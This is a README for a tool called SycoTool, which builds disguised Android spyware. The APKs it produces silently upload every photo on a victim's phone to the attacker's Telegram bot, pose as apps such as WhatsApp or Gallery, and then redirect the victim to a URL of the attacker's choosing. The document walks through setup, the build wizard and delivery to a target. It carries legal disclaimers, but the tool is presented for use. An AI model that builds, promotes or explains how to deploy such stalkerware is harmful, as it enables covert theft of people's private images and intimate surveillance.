<div align="center">

# 🕵️ SycoTool

### Malicious APK Builder — Silent Photo Exfiltration via Telegram

[![Version](https://img.shields.io/badge/version-v1.0-blue.svg)](https://github.com/hex0user/SycoTool)
[![Platform](https://img.shields.io/badge/platform-Kali%20Linux%20%7C%20NetHunter-orange.svg)](https://kali.org)
[![Android](https://img.shields.io/badge/Android-5.0%20--%2015-brightgreen.svg)](https://android.com)
[![License](https://img.shields.io/badge/license-Proprietary-red.svg)](LICENSE)
[![Telegram](https://img.shields.io/badge/Telegram-@issamiso-2CA5E0?logo=telegram)](https://t.me/issamiso)
[![Channel](https://img.shields.io/badge/Channel-mylinuxlife-2CA5E0?logo=telegram)](https://t.me/mylinuxlife)
[![GitHub](https://img.shields.io/badge/GitHub-hex0user-181717?logo=github)](https://github.com/hex0user)

**Build a weaponized Android APK that silently sends every photo on the victim's device to your Telegram bot, then redirects them to a URL of your choice — in one command.**

[Capabilities](#-capabilities) • [How It Works](#-how-it-works) • [Installation](#-installation) • [Usage](#-usage) • [Legal](#%EF%B8%8F-legal-disclaimer)

</div>

---

## ⚠️ LEGAL DISCLAIMER

> **THIS TOOL IS PROVIDED FOR EDUCATIONAL AND AUTHORIZED SECURITY RESEARCH ONLY.**
>
> **By downloading, installing, or using SycoTool, you agree that:**
>
> 1. You will ONLY use it on devices **you personally own**, or on devices
>    for which you have **signed written authorization** from the owner.
> 2. You understand that **unauthorized use is a CRIMINAL OFFENSE** in every
>    country — punishable by imprisonment and heavy fines.
> 3. The developer (**Issam Junior — @issamiso**) is **NOT responsible** for
>    any damage, harm, legal consequence, or misuse caused by this tool.
> 4. **You alone** bear full legal responsibility for your actions.
>
> **Examples of ILLEGAL use:**
> - ❌ Installing on a spouse's / partner's / family member's phone
> - ❌ Installing on a friend's / colleague's / employee's device
> - ❌ Distributing the generated APK to anyone without written consent
> - ❌ Any use against a device you do not own
>
> **Cybercrime is prosecuted aggressively worldwide. You WILL be traced.**

---

## 🎯 Capabilities

SycoTool generates a **fully functional, signed Android APK** that behaves
as a silent spyware implant. Once the victim installs and opens it:

| # | Capability | Details |
|---|-----------|---------|
| 1 | 📸 **Silent Photo Exfiltration** | Scans the entire device storage and uploads **every image** (JPG / PNG / JPEG / WEBP / GIF / BMP / HEIC) to your Telegram bot |
| 2 | 🔄 **Runs in Background** | As soon as the victim taps the app icon, it starts a foreground service and keeps running silently — the victim sees nothing suspicious |
| 3 | 🤖 **Telegram-Controlled** | All photos arrive directly in **your personal Telegram chat** via the Bot API — no server needed |
| 4 | 🔗 **Post-Exfiltration Redirect** | Once all photos are uploaded, the victim is automatically redirected to **any URL you choose** (e.g. a Telegram channel, a website, a fake "thank you" page) |
| 5 | 🎭 **Full Rebranding** | The APK is rebuilt with a **custom app name** and **custom launcher icon** so it looks legitimate (WhatsApp, Gallery, System Update, etc.) |
| 6 | 📱 **Universal Compatibility** | Works on **Android 5.0 (Lollipop) → Android 15** |
| 7 | 🔐 **Signed & Ready** | Produced APK is aligned and signed — ready to install on any device |
| 8 | 📜 **Payload History** | Every generated APK is archived locally and can be re-deployed anytime |

---

## 🔥 How It Works

```
            +--------------------------+
            |   YOUR TELEGRAM BOT      |
            |   (attacker's chat)      |
            +-------------^------------+
                          |
                   Photos uploaded
                   via Bot API (HTTPS)
                          |
            +-------------+------------+
            |    VICTIM'S DEVICE       |
            |  (with installed APK)    |
            |                          |
            |  1. Victim taps icon     |
            |  2. Service starts       |
            |  3. Scans all photos     |
            |  4. Uploads to Telegram  |
            |  5. Opens redirect URL   |
            +--------------------------+

            +--------------------------+
            |   YOUR KALI / NETHUNTER  |
            |                          |
            |  1. Pick base APK        |
            |  2. Inject smali code    |
            |  3. Set app name + icon  |
            |  4. Set your bot token   |
            |  5. Build & sign APK     |
            |  6. Deliver to victim    |
            +--------------------------+
```

---

## ✨ Features

- 🕵️ **Complete Silent Spyware** — No visible UI, no notifications
- 📸 **Full Device Photo Scraping** — Every image, every folder
- 🤖 **Telegram Bot Receiver** — You own the bot, you own the data
- 🔄 **Foreground Service** — Keeps running even if the victim kills the app
- 🔗 **Custom Redirect** — Send victims anywhere after exfiltration
- 🎭 **Trojan Disguise** — Rename and re-icon to anything
- 📱 **Android 5.0 → 15** — Works on every modern device
- 🔐 **Signed APK** — Installs cleanly without warnings
- 📦 **One-Command Build** — From base APK to weaponized APK in seconds

---

## 📋 Requirements

| Tool | Purpose | Auto-Installed |
|------|---------|:--------------:|
| **Java (JDK 17+)** | apktool runtime | ✅ |
| **apktool** | Decompile / rebuild APKs | ✅ |
| **zipalign** | Optimize APK boundaries | ✅ |
| **apksigner** | Sign with keystore | ✅ |
| **wget / unzip / tar / xz** | Download & extract | ✅ |

**Supported platforms:**

- ✅ Kali Linux
- ✅ Kali NetHunter
- ✅ Debian / Ubuntu
- ✅ Any Debian-based distro

**Target compatibility:**

- ✅ Android 5.0 (Lollipop) — API 21
- ✅ Android 6, 7, 8, 9, 10, 11, 12, 13, 14
- ✅ Android 15 (Vanilla Ice Cream) — API 35

---

## 🚀 Installation

### One-Command Setup (Recommended)

```bash
git clone https://github.com/hex0user/SycoTool.git
cd SycoTool
chmod +x sycotool.sh
./sycotool.sh
```

The script will:

1. Detect your distro
2. Install only the missing dependencies
3. Extract the payload generator binary
4. Launch it automatically

---

## 🎮 Usage

### Step 1 — Create a Telegram Bot

1. Open Telegram → search **@BotFather**
2. Send `/newbot` → follow instructions
3. **Copy your bot token** (looks like 123456789:ABCdef...)

### Step 2 — Get Your Chat ID

1. Open Telegram → search **@userinfobot**
2. Send `/start`
3. **Copy your numeric ID** (e.g. 123456789)

### Step 3 — Build the Payload

```bash
./sycotool.sh
```

Choose **[1] Create New Payload**, then answer the wizard:

| Step | Prompt | Example |
|------|--------|---------|
| 1 | **App name** | Gallery, System Update, WhatsApp |
| 2 | **Redirect URL** | https://t.me/mylinuxlife |
| 3 | **Telegram User ID** | 123456789 |
| 4 | **Bot Token** | 123456789:ABCdef... |
| 5 | **Icon path** | /root/gallery_icon.png (optional) |

The tool will:

1. Copy the base APK
2. Inject the exfiltration smali code
3. Rebrand the app name + icon
4. Inject your bot credentials
5. Build → align → sign the APK

**Result:** A signed, installable APK ready for delivery.

### Step 4 — Deploy

Deliver the generated APK to the target device however you wish
(authorized penetration test only).

Once installed and opened:

- ✅ The app icon disappears into the background
- ✅ All photos start flowing to your Telegram bot
- ✅ After the last photo, the victim is redirected to your URL

### Viewing History

Menu option **[2]** lists every generated payload with:

- Project name
- Creation timestamp
- Option to copy any payload to any destination path

---

## 🛡️ Ethical Use Cases

SycoTool exists to **demonstrate how modern Android spyware works** — not
to facilitate real attacks.

**Legitimate use cases:**

- 🔬 Malware analysis and reverse-engineering courses
- 🎓 Security awareness training (build the payload, then show how to detect it)
- 🧪 CTF challenges on **your own** devices
- 🎯 Red-team engagements with **signed written authorization**
- 📚 Academic research on Android security

**NEVER use this against:**

- ❌ A partner, spouse, ex, or family member
- ❌ Friends, colleagues, or employees
- ❌ Any device you do not personally own
- ❌ Anyone who has not given explicit written consent

**Installing spyware on someone else's device is a serious crime.**
**You will be caught. You will be prosecuted.**

---

## 🐛 Troubleshooting

| Problem | Solution |
|---------|----------|
| xz: command not found | sudo apt install xz-utils |
| apktool: command not found | sudo apt install apktool |
| Extraction fails | Check disk space: df -h ~ |
| Permission denied | chmod +x core/sycotool |
| Photos not arriving | Verify bot token + user ID are correct |
| APK install blocked | Enable "Install from unknown sources" on target |

---

## 📞 Contact

<div align="center">

| Platform | Link |
|----------|------|
| **Developer** | Issam Junior |
| **GitHub** | [@hex0user](https://github.com/hex0user) |
| **Telegram** | [@issamiso](https://t.me/issamiso) |
| **Channel** | [mylinuxlife](https://t.me/mylinuxlife) |

</div>

---

## 📜 License

**Proprietary License** — see [LICENSE](LICENSE).

- ❌ No selling
- ❌ No modifying
- ❌ No redistribution without attribution
- ✅ Personal & educational use only
- ✅ Authorized penetration testing only

---

## ⚖️ Final Warning

> **You are the only person responsible for what you do with this tool.**
>
> The developer provides SycoTool **as-is**, for **education and authorized
> testing only**. Any use against a device you do not own or lack written
> permission to test is **illegal** and may result in:
>
> - Criminal prosecution
> - Prison sentence
> - Permanent criminal record
> - Civil lawsuits
>
> **Think before you act. Respect other people's privacy.**

<div align="center">

**Made with ❤️ by [Issam Junior (@hex0user)](https://github.com/hex0user)**

</div>
